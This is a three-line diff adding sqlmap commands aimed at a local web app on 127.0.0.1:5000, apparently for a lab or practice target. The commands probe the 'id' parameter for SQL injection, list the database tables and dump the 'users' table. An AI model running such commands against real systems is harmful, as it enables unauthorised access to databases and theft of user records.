@@ -1,0 +1,3 @@
+sqlmap -u "http://127.0.0.1:5000/?id=1"
+sqlmap -u "http://127.0.0.1:5000/?id=1" --tables
+sqlmap -u "http://127.0.0.1:5000/?id=1" -T users --dump
